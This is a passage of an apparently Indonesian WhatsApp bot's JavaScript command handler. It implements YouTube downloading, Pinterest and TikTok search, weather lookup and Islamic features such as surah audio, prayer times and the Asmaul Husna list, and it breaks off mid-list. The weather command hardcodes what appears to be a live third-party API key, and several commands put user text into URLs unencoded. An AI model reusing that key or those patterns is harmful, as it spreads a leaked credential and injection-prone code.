case 'ytmp3': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Masukkan Url Yotube\n\nExample: ${XyrooRynzz} Url`)
    
async function ytmp3(url) {
    const format = "mp3"; 
    const response = await axios.get(`https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(url)}`, {
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            "Referer": "https://youtubedownloader.me/"
        }
    });
    const videoId = response.data.id;
    let progress = 0;
    let downloadUrl = null;
    let attempt = 0;
    while (progress < 1000 && attempt < 20) {
        const progressResponse = await axios.get(`https://youtubedownloader.me/api/progress?id=${videoId}`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Referer": "https://youtubedownloader.me/"
            }
        });

        progress = progressResponse.data.progress;
        if (progress >= 1000) {
            downloadUrl = progressResponse.data.download_url;
            break;
        }
        attempt++;
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    return downloadUrl;
}

    let b = await ytmp3(text)
    
    Alice.sendMessage(m.chat, {
        audio: {
            url: b
        }, 
        mimetype: "audio/mpeg",
        ptt: true 
    }, { quoted: m })
}
break


case 'ytmp4' : {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Masukkan Url Yotube\n\nExample: ${XyrooRynzz} Url`)

async function ytmp4(url) {
    const format = "360"; 
    const response = await axios.get(`https://youtubedownloader.me/api/download?format=${format}&url=${encodeURIComponent(url)}`, {
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            "Referer": "https://youtubedownloader.me/"
        }
    });
    const videoId = response.data.id;
    let progress = 0;
    let downloadUrl = null;
    let attempt = 0;
    while (progress < 1000 && attempt < 20) {
        const progressResponse = await axios.get(`https://youtubedownloader.me/api/progress?id=${videoId}`, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                "Referer": "https://youtubedownloader.me/"
            }
        });

        progress = progressResponse.data.progress;
        if (progress >= 1000) {
            downloadUrl = progressResponse.data.download_url;
            break;
        }
        attempt++;
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    return downloadUrl;
}

    let b = await ytmp4(text)
    
    Alice.sendMessage(m.chat, {
        video: {
            url: b
        } 
    }, { quoted: m })
}
break

case "pin":
  case "pinterest":{
 if (isBan) return XRB()
await XReaction()
      if (!text) return reply(`Example : ${XyrooRynzz} Michie jkt48`);
      let data =  await require('axios').get(`https://api.siputzx.my.id/api/s/pinterest?query=${text}`)
      let a = data.data.data
      let result = a[Math.floor(Math.random() * a.length)];
      Alice.sendButtonImg(m.chat,
        [
            {
                id: `${XyrooRynzz} ${text}`,
                text: 'Next',
                type: 1
            }
        ],"Pin Search Ressults", result.images_url, `© ${botname} `, m, {viewOnce: true })
  }
  break;

case 'tiktoksearch':
case 'ttsearch': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Contoh : ${XyrooRynzz} jj epep`)
await XReaction()
try {
let anu = await ds.search.tiktoks(text)
let cap = `*T I K T O K - S E A R C H*\n\n*Tittle* : ${anu.title}\n*Cover* : ${anu.cover}`
Alice.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: cap }, { quoted: m })
Alice.sendMessage(m.chat, { audio: { url: anu.music }, mimetype: 'audio/mpeg' }, { quoted: m })
} catch (error) {
reply('Error :v')
}
}
break

case 'weather':{
if (isBan) return XRB()
await XReaction()
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           Alice.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Search Features End
//📈————————————————————————— [ Batas Fitur Sayangg ] —————————————————————————📉\\
           
//📈————————————————————————— [ © XyrooRynzz ] —————————————————————————📉\\
//————————————————————————//
// Islami Features
//📈————————————————————————— [ Features ↓↓ ] —————————————————————————📉\\
case 'murotal': {
if (isBan) return XRB()
await XReaction()
  if (!args[0]) {
    try {
      let { data } = await axios.get('https://gist.githubusercontent.com/Bell575/382f3dd393f45eaac298d5b845112258/raw/dbcdc554a51e06a13795a2ff1fe15b85f55e8d9d/List%2520Surah')
      return reply(
        `Cara Pakai : murotal [Nomor Surah]\n*Example : .murotal 144*\n\n*List Surah :*\n\n${data}\n\n`
      )
    } catch (e) {
      return reply('Gagal Ambil List Surah')
    }
  }

  try {
    let { data } = await axios.get(`https://cloudku.us.kg/api/murotal/surah?id=${args[0]}`)
    let res = data.result
    if (!res) return reply('Surah Gak Ada')

    let teks =
      `Surah : ${res.name_id}\n\n` +
      `Nomor : ${res.number}\n` +
      `Nama Latin : ${res.name_en}\n` +
      `Nama Arab : ${res.name_long}\n` +
      `Jumlah Ayat : ${res.number_of_verses}\n` +
      `Tempat Turun : ${res.revelation_id} (${res.revelation_en})\n` +
      `Urutan Wahyu : ${res.sequence}\n` +
      `Arti : ${res.translation_id} (${res.translation_en})\n\n` +
      `Tafsir :\n${res.tafsir}`

    await reply(teks)
    await Alice.sendMessage(m.chat, {
      audio: { url: res.audio_url },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m })

  } catch (e) {
    reply('Failed to fetch surah data. Make sure the surah number is correct')
  }
}
break;
case 'ayat': {
  if (isBan) return XRB()
await XReaction()
 if (!text) {
 return reply(`Masukkan format\nExample: ${XyrooRynzz} <surah> <ayat>`);
 }

 let [surah, ayat] = text.split(" ");
 if (!surah || !ayat || isNaN(surah) || isNaN(ayat)) {
 return reply("Format tidak valid. Pastikan Anda memasukkan angka untuk surah dan ayat.");
 }

async function alquran(surah, ayat) {
    try {
        const url = `https://www.velyn.biz.id/api/search/alquran?surah=${surah}&ayat=${ayat}`;
        const response = await fetch(url);

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const data = await response.json();

        if (!data || !data.text) {
            throw new Error("Data tidak ditemukan atau format tidak valid.");
        }

        return {
            text: data.text,
            translation: data.translation,
            tafsir: data.tafsir,
            surah_nama: data.surah_nama,
            surah: data.surah,
            ayat: data.ayat,
            revelation_place: data.revelation_place,
            surah_total_ayat: data.surah_total_ayat,
            tafsir_lengkap: data.tafsir_lengkap
        };
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
        return null;
    }
}

 try {
        let result = await alquran(surah, ayat);
        if (result) {
            let output = `📖 **Surah ${result.surah_nama} (${surah}), Ayat ${ayat}**\n\n${result.text}\n\n📜 **Terjemahan:** ${result.translation}\n\n📝 **Tafsir Singkat:** ${result.tafsir}\n\n📌 **Informasi Tambahan:**\n- **Nama Surah**: ${result.surah_nama}\n- **Nomor Surah**: ${result.surah}\n- **Nomor Ayat**: ${result.ayat}\n- **Revelasi**: ${result.revelation_place}\n- **Jumlah Ayat dalam Surah**: ${result.surah_total_ayat}\n- **Tafsir Lengkap**: ${result.tafsir_lengkap}`;
            reply(m.chat, output, m);
        } else {
           reply("Ayat tidak ditemukan.")
        }
    } catch (error) {
        reply(m.chat, `Terjadi kesalahan: ${error.message}`, m);
    }
};
break;
case 'caridoa':
case 'doa': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply('Contoh : .doa Bangun Tidur');
await XReaction()
let Xyroo = await fetchJson(`https://api.autoresbot.com/api/doa?q=${text}`)
let cap = Xyroo.data[0];
let doanya = `*_${cap.doa}_\n${cap.ayat}\n${cap.latin}\nArtinya : ${cap.artinya}"`
await reply(doanya)
}
break

case 'tafsir': 
case 'tafsirsurah': {
if (isBan) return XRB()
await XReaction()
    if (!text) return reply(`Example : .tafsir adam\n\n💡 *Tips* : Ketik nama surah yang ingin Anda ketahui tafsirnya, misalnya '.tafsir Yusuf'.`)
  await XReaction();
    try {
        let response = await fetchJson(`https://widipe.com/tafsirsurah?text=${text}`);
const results = response.result;
function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
const anubis = getRandomElement(results);
if (anubis && anubis.surah && anubis.tafsir && anubis.type && anubis.source) {
    let surah = anubis.surah;
    let tafsir = anubis.tafsir;
    let artikel = anubis.type;
    let source = anubis.source;

    let tafsirResult = `🌿 *Tafsir Surah ${surah}*\n\n` +
        `• *Surah* : ${surah}\n` +
        `• *Tafsir* :\n${tafsir}\n\n` +
        `• *Kategori Tafsir* : ${artikel}\n` +
        `• *Sumber* : ${source}\n\n` +
        `Terima kasih telah menggunakan layanan kami! 🌸`;

    return reply(tafsirResult);
} else {
    return reply("*Maaf, data tafsir tidak lengkap atau tidak ditemukan.*");
}
    } catch (error) {
        return reply("*Terjadi Kesalahan!* 🙁\n\nMohon maaf, ada masalah saat mencari tafsir surah. Silakan coba lagi nanti.");
    }
}
                break

case 'jadwalsholat': {
if (isBan) return XRB()
await XReaction()
     if (!text) return reply(`[ Example ] : Jadwalsholat Lokasi Anda`) 
     try {
        let respon = await fetch(`https://api.agatz.xyz/api/jadwalsholat?kota=${text}`);
        let waktu = await respon.json();       
        let subuh = waktu.data.subuh;
        let dhuhur = waktu.data.dhuhur;
        let ashar = waktu.data.ashar;
        let maghrib = waktu.data.maghrib;
        let isya = waktu.data.isya;
        // Menampilkan hasil Ya woy
        Alice.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/nb7wuq.jpg' },
            caption: `*Jadwal Sholat di Kota ${text}*\n\n` +
                     `🕌 Subuh: ${subuh}\n` +
                     `🕌 Dhuhur: ${dhuhur}\n` +
                     `🕌 Ashar: ${ashar}\n` +
                     `🕌 Maghrib: ${maghrib}\n` +
                     `🕌 Isya: ${isya}\n\n` +
                     `Jangan Lupa Sholat Dan Semoga sholat kita diterima Allah SWT.`,
        });
    } catch (error) {
        console.error(error);
        reply('*Terjadi kesalahan saat melakukan pencarian. Silakan coba lagi.*');
   }
 }
                break

case 'artisurah': {
if (isBan) return XRB()
await XReaction()
  if (!q) return reply(`Example ${XyrooRynzz} 113`)
async function surah(no){
	return new Promise(async(resolve, reject) => {
		axios.get('https://kalam.sindonews.com/surah/' + no)
		.then(({ data }) => {
			const $ = cheerio.load(data)
			const result = [];
			const ar = [];
			const id = [];
			const lt = [];
			const au = [];
			$('div.breadcrumb-new > ul > li:nth-child(5)').each(function(c,d) {
			result.audio = $(d).find('a').attr('href').replace('surah','audioframe')
			})
			$('div.ayat-arab').each(function(a, b) {
				ar.push($(b).text()) 
			})
			$('li > div.ayat-text').each(function(e, f) {
				id.push($(f).text().replace(',','').trim()) })
			$('div.ayat-latin').each(function(g, h) {
				lt.push($(h).text().trim())	})
			for(let i = 0; i < ar.length ; i++){
			result.push({
				arab: ar[i],
				indo: id[i],
				latin: lt[i],
			})
		}
			resolve(result)
		})
		.catch(reject)
	})
}
surah(q).then(result => {
 if (result.length === 0) {
 reply('Tidak ada hasil yang ditemukan.');
 return;
 }
 
 let replyTexttt = `Hasil dari Surah untuk "${q}":\n\n`;
 result.forEach((result, index) => {
 replyTexttt += `${result.indo}\n${result.arab}\n${result.latin}\n\n`;
 });
 
 reply(replyTexttt);
 }).catch(error => {
 reply('Terjadi kesalahan saat memasuki angka di surah.');
 console.error(error);
 });
}
break
case 'niatsholat': {
if (isBan) return XRB()
await XReaction()
    if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
    {
        index: 1,
        solat: "subuh",
        latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 2,
        solat: "maghrib",
        latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 3,
        solat: "dzuhur",
        latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 4,
        solat: "isha",
        latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
    },
    {
        index: 5,
        solat: "ashar",
        latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
        arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
        translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
    }
]
    let text = q.toLowerCase() || ''
    let data = Object.values(niatsholat).find(v => v.solat == text)
    if (!data) return reply(`${text} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
    reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break
 case 'kisahnabi': {
if (isBan) return XRB()
await XReaction()

     if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)

     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)

     let kisah = await url.json().catch(_ => "Error")

     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")

     

    let hasil = `_*👳 Nabi :*_ ${kisah.name}

_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}

_*📍 Tempat Lahir :*_ ${kisah.tmp}

_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}

break
        
case 'ayatkursi': {
if (isBan) return XRB()
await XReaction()

  let caption = `

*「 Ayat Kursi 」*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ

“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”

Artinya:

Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.

Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 

(QS. Al Baqarah: 255)

`.trim()

  reply(caption)

}

break            
case 'dalamislam': {
if (isBan) return XRB()
await XReaction()
    if (!q.trim()) return reply("_contoh .dalamislam dosa");
// wm avs
    const axios = require('axios');
    const cheerio = require('cheerio');
// wm avs
    async function scrapeHadis(searchTerm) {
        const url = `https://dalamislam.com/?s=${encodeURIComponent(searchTerm)}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const hadisList = [];
// wm avs
            $('.entry-title a').each((index, element) => {
                const title = $(element).text().trim();
                const link = $(element).attr('href');
                hadisList.push({ title, link });
            });
// wm avs
            return hadisList;
        } catch (error) {
            console.error('Error fetching data:', error);
            throw new Error('elul.');
        }
    }
// wm avs
    scrapeHadis(q)
        .then(results => {
            if (results.length === 0) {
                reply('tak ada hasil.');
            } else {
                let response = `Hasil pencarian hadis dari Dalam Islam untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
                });
                reply(response);
            }
        })
        .catch(error => {
            console.error(`${error.message}`);
            reply('Terjadi kesalahan.');
        });
}
    break        
case 'kisahnabi': {
if (isBan) return XRB()
await XReaction()
if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/Sanz-MDChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")

let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

reply(`${hasil}`)

}
break

case 'asmaulhusna': {
if (isBan) return XRB()
await XReaction()
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
        },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
